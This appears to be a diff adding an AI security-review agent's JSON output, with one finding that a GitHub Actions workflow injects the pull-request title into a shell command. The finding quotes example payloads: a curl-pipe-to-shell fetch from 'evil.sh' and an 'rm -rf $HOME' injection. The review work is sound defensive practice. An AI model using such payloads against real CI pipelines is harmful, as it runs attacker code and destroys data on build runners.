@@ -1,0 +1,6 @@
+{
+  "text": "{\"findings\": [{\"agent\": \"security\", \"file\": \"ci/build.yml\", \"line_start\": 12, \"line_end\": 12, \"severity\": \"high\", \"confidence\": 0.9, \"rule_id\": \"CWE-94\", \"title\": \"The \\\"Greet PR (unsafe)\\\" step interpolates the attacker-controlled ${{ github....\", \"fact\": \"The \\\"Greet PR (unsafe)\\\" step interpolates the attacker-controlled ${{ github.event.pull_request.title }} expression directly into the body of a run: shell command. GitHub Actions substitutes the expression before the shell parses the line, so a PR whose title contains shell metacharacters (e.g. \\\"$(curl evil.sh | sh)\\\" or \\\"\\\\\\\"; rm -rf $HOME; #\\\") is executed as commands on the runner. The value must be passed through an env: binding and referenced as a quoted \\\"$VAR\\\" so the shell treats it as data, not code.\", \"assumption\": null, \"impact\": \"Exploitable / incorrect behaviour as described.\", \"recommendation\": \"Remediate per the rule guidance.\", \"evidence_quote\": \"        run: echo \\\"Reviewing PR titled ${{ github.event.pull_request.title }}\\\"\", \"suggested_patch\": null, \"references\": []}], \"drops\": []}",
+  "tokens_in": 857,
+  "tokens_out": 268,
+  "model": "claude-sonnet-5"
+}
